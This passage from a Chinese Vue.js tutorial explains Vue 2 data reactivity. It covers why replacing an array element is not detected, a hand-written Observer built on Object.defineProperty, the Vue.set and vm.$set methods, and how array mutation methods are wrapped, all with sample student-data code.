class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">persons</span>:[</span><br><span class="language-javascript">                &#123;<span class="hljs-attr">id</span>:<span class="hljs-string">&#x27;001&#x27;</span>,<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;马冬梅&#x27;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">30</span>,<span class="hljs-attr">sex</span>:<span class="hljs-string">&#x27;女&#x27;</span>&#125;,</span><br><span class="language-javascript">                &#123;<span class="hljs-attr">id</span>:<span class="hljs-string">&#x27;002&#x27;</span>,<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;周冬雨&#x27;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">31</span>,<span class="hljs-attr">sex</span>:<span class="hljs-string">&#x27;女&#x27;</span>&#125;,</span><br><span class="language-javascript">                &#123;<span class="hljs-attr">id</span>:<span class="hljs-string">&#x27;003&#x27;</span>,<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;周杰伦&#x27;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">18</span>,<span class="hljs-attr">sex</span>:<span class="hljs-string">&#x27;男&#x27;</span>&#125;,</span><br><span class="language-javascript">                &#123;<span class="hljs-attr">id</span>:<span class="hljs-string">&#x27;004&#x27;</span>,<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;温兆伦&#x27;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">19</span>,<span class="hljs-attr">sex</span>:<span class="hljs-string">&#x27;男&#x27;</span>&#125;</span><br><span class="language-javascript">            ]</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">updateMei</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-comment">// this.persons[0].name = &#x27;马老师&#x27; //奏效</span></span><br><span class="language-javascript">                <span class="hljs-comment">// this.persons[0].age = 50 //奏效</span></span><br><span class="language-javascript">                <span class="hljs-comment">// this.persons[0].sex = &#x27;男&#x27; //奏效</span></span><br><span class="language-javascript">                <span class="hljs-variable language_">this</span>.<span class="hljs-property">persons</span>[<span class="hljs-number">0</span>] = &#123;<span class="hljs-attr">id</span>:<span class="hljs-string">&#x27;001&#x27;</span>,<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;马老师&#x27;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">50</span>,<span class="hljs-attr">sex</span>:<span class="hljs-string">&#x27;男&#x27;</span>&#125; <span class="hljs-comment">//不奏效</span></span><br><span class="language-javascript">                <span class="hljs-comment">// this.persons.splice(0,1,&#123;id:&#x27;001&#x27;,name:&#x27;马老师&#x27;,age:50,sex:&#x27;男&#x27;&#125;)</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;) </span><br><span class="language-javascript"></span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>点击更新马冬梅的信息，马冬梅的数据并没有发生改变。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124114422193.png" alt="image-20221124114422193"></p><p>我们来看看控制台：<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124114436786.png" alt="image-20221124114436786"></p><p>控制台上的数据发生了改变，说明，这个更改的数据并没有被 vue 监测到。</p><p>所以我们来研究一下 Vue 监测的原理。</p><p>我们先研究 Vue 如何监测 对象里的数据</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 准备好一个容器--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学校名称：&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学校地址：&#123;&#123;address&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span> <span class="hljs-comment">//阻止 vue 在启动时生成生产提示。</span></span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;家里蹲大学&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">address</span>:<span class="hljs-string">&#x27;China&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">student</span>:&#123;</span><br><span class="language-javascript">                <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;tom&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-attr">age</span>:&#123;</span><br><span class="language-javascript">                    <span class="hljs-attr">rAge</span>:<span class="hljs-number">40</span>,</span><br><span class="language-javascript">                    <span class="hljs-attr">sAge</span>:<span class="hljs-number">29</span>,</span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                <span class="hljs-attr">friends</span>:[</span><br><span class="language-javascript">                    &#123;<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;jerry&#x27;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">35</span>&#125;</span><br><span class="language-javascript">                ]</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>讲一下解析模板后面的操作—》调用 set 方法时，就会去解析模板—–&gt;生成新的虚拟 DOM—–&gt;新旧DOM 对比 —–&gt; 更新页面</p></blockquote><p>模拟一下 vue 中的 数据监测</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs html">     <span class="hljs-comment">&lt;!-- 准备好一个容器--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> &gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">let</span> data = &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;尚硅谷&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">address</span>:<span class="hljs-string">&#x27;北京&#x27;</span>,</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">//创建一个监视的实例对象，用于监视data中属性的变化</span></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> obs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Observer</span>(data)</span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obs)</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">//准备一个vm实例对象</span></span><br><span class="language-javascript">    <span class="hljs-keyword">let</span> vm = &#123;&#125;</span><br><span class="language-javascript">    vm.<span class="hljs-property">_data</span> = data = obs</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">function</span> <span class="hljs-title function_">Observer</span>(<span class="hljs-params">obj</span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-comment">//汇总对象中所有的属性形成一个数组</span></span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> keys = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(obj)</span><br><span class="language-javascript">        <span class="hljs-comment">//遍历</span></span><br><span class="language-javascript">        keys.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">k</span>) =&gt;</span> &#123;</span><br><span class="language-javascript">            <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(<span class="hljs-variable language_">this</span>, k, &#123;</span><br><span class="language-javascript">                <span class="hljs-title function_">get</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                    <span class="hljs-keyword">return</span> obj[k]</span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                <span class="hljs-title function_">set</span>(<span class="hljs-params">val</span>) &#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;k&#125;</span>被改了，我要去解析模板，生成虚拟DOM.....我要开始忙了`</span>)</span><br><span class="language-javascript">                    obj[k] = val</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;)</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124114942841.png" alt="image-20221124114942841"></p><p><strong>Vue.set 的使用</strong></p><p><code>Vue.set(target，propertyName/index，value)</code> 或</p><p><code>vm.$set(target，propertyName/index，value)</code></p><p><strong>用法</strong> ：</p><p>向响应式对象中添加一个 property，并确保这个新 property 同样是响应式的，且触发视图更新。它必须用于向响应式对象上添加新property，因为 Vue 无法探测普通的新增 property (比如 <code>vm.myObject.newProperty = &#39;hi&#39;</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 准备好一个容器--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>学生信息<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;addSex&quot;</span>&gt;</span>添加性别属性，默认值：男<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span> <span class="hljs-comment">//阻止 vue 在启动时生成生产提示。</span></span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">student</span>:&#123;</span><br><span class="language-javascript">                <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;tom&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-attr">age</span>:<span class="hljs-number">18</span>,</span><br><span class="language-javascript">                <span class="hljs-attr">hobby</span>:[<span class="hljs-string">&#x27;抽烟&#x27;</span>,<span class="hljs-string">&#x27;喝酒&#x27;</span>,<span class="hljs-string">&#x27;烫头&#x27;</span>],</span><br><span class="language-javascript">                <span class="hljs-attr">friends</span>:[</span><br><span class="language-javascript">                    &#123;<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;jerry&#x27;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">35</span>&#125;,</span><br><span class="language-javascript">                    &#123;<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;tony&#x27;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">36</span>&#125;</span><br><span class="language-javascript">                ]</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">addSex</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-comment">// Vue.set(this.student,&#x27;sex&#x27;,&#x27;男&#x27;)</span></span><br><span class="language-javascript">                <span class="hljs-variable language_">this</span>.$set(<span class="hljs-variable language_">this</span>.<span class="hljs-property">student</span>,<span class="hljs-string">&#x27;sex&#x27;</span>,<span class="hljs-string">&#x27;男&#x27;</span>)</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Vue.set() 或 vm.$set 有缺陷：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/954f0312289748c189bac545b4463c63.png" alt="在这里插入图片描述"></p><blockquote><p>就是 vm 和 _data</p></blockquote><p>看完了 vue 监测对象中的数据，再来看看 vue 如何监测 数组里的数据</p><blockquote><p>先写个代码案例</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>学生信息<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;student.age++&quot;</span>&gt;</span>年龄+1岁<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;addSex&quot;</span>&gt;</span>添加性别属性，默认值：男<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;student.sex = &#x27;未知&#x27; &quot;</span>&gt;</span>修改性别<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;addFriend&quot;</span>&gt;</span>在列表首位添加一个朋友<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;updateFirstFriendName&quot;</span>&gt;</span>修改第一个朋友的名字为：张三<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;delteFirstFriendName&quot;</span>&gt;</span>删除第一个朋友<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;addHobby&quot;</span>&gt;</span>添加一个爱好<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;updateHobby&quot;</span>&gt;</span>修改第一个爱好为：开车<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;removeSmoke&quot;</span>&gt;</span>过滤掉爱好中的抽烟<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>姓名：&#123;&#123; student.name &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>年龄：&#123;&#123; student.age &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">&quot;student.sex&quot;</span>&gt;</span>性别：&#123;&#123;student.sex&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>爱好：<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;(h,index) in student.hobby&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;index&quot;</span>&gt;</span>&#123;&#123; h &#125;&#125; <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>朋友们：<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;(f,index) in student.friends&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;index&quot;</span>&gt;</span>&#123;&#123; f.name &#125;&#125;--&#123;&#123; f.age &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">student</span>: &#123;</span><br><span class="language-javascript">                    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;tom&#x27;</span>,</span><br><span class="language-javascript">                    <span class="hljs-attr">age</span>: <span class="hljs-number">18</span>,</span><br><span class="language-javascript">                    <span class="hljs-attr">hobby</span>: [<span class="hljs-string">&#x27;抽烟&#x27;</span>, <span class="hljs-string">&#x27;喝酒&#x27;</span>, <span class="hljs-string">&#x27;烫头&#x27;</span>],</span><br><span class="language-javascript">                    <span class="hljs-attr">friends</span>: [</span><br><span class="language-javascript">                        &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;jerry&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">35</span> &#125;,</span><br><span class="language-javascript">                        &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;tony&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">36</span> &#125;</span><br><span class="language-javascript">                    ]</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">                <span class="hljs-title function_">addSex</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                    <span class="hljs-comment">// Vue.set(this.student,&#x27;sex&#x27;,&#x27;男&#x27;)</span></span><br><span class="language-javascript">                    <span class="hljs-variable language_">this</span>.$set(<span class="hljs-variable language_">this</span>.<span class="hljs-property">student</span>, <span class="hljs-string">&#x27;sex&#x27;</span>, <span class="hljs-string">&#x27;男&#x27;</span>)</span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                <span class="hljs-title function_">addFriend</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">student</span>.<span class="hljs-property">friends</span>.<span class="hljs-title function_">unshift</span>(&#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;jack&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">70</span> &#125;)</span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                <span class="hljs-title function_">updateFirstFriendName</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                    <span class="hljs-comment">//this.student.friends[0]是对象默认是响应式</span></span><br><span class="language-javascript">                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">student</span>.<span class="hljs-property">friends</span>[<span class="hljs-number">0</span>].<span class="hljs-property">name</span> = <span class="hljs-string">&#x27;张三&#x27;</span></span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                <span class="hljs-title function_">delteFirstFriendName</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">student</span>.<span class="hljs-property">friends</span>[<span class="hljs-number">0</span>]=&#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;jack&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">70</span> &#125;</span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                <span class="hljs-title function_">addHobby</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">student</span>.<span class="hljs-property">hobby</span>.<span class="hljs-title function_">push</span>(<span class="hljs-string">&#x27;学习&#x27;</span>)</span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                <span class="hljs-title function_">updateHobby</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                    <span class="hljs-comment">// this.student.hobby.splice(0,1,&#x27;开车&#x27;)</span></span><br><span class="language-javascript">                    <span class="hljs-comment">// Vue.set(this.student.hobby,0,&#x27;开车&#x27;)</span></span><br><span class="language-javascript">                    <span class="hljs-variable language_">this</span>.$set(<span class="hljs-variable language_">this</span>.<span class="hljs-property">student</span>.<span class="hljs-property">hobby</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;开车&#x27;</span>)</span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                <span class="hljs-title function_">removeSmoke</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">student</span>.<span class="hljs-property">hobby</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">student</span>.<span class="hljs-property">hobby</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">h</span>) =&gt;</span> &#123;</span><br><span class="language-javascript">                        <span class="hljs-keyword">return</span> h !== <span class="hljs-string">&#x27;抽烟&#x27;</span></span><br><span class="language-javascript">                    &#125;)</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124115132933.png" alt="image-20221124115132933"></p><blockquote><p>所以我们通过 vm._data.student.hobby[0] &#x3D; ‘aaa’ &#x2F;&#x2F; 不奏效</p><p>vue 监测在数组那没有 getter 和 setter，所以监测不到数据的更改，也不会引起页面的更新</p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124115153647.png" alt="image-20221124115153647"></p><p>既然 vue 在对数组无法通过 getter 和 setter 进行数据监视，那 vue 到底如何监视数组数据的变化呢？</p><p>vue对数组的监测是通过 包装数组上常用的用于修改数组的方法来实现的。</p><p>vue官网的解释：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124115209402.png" alt="image-20221124115209402"></p><p><strong>总结 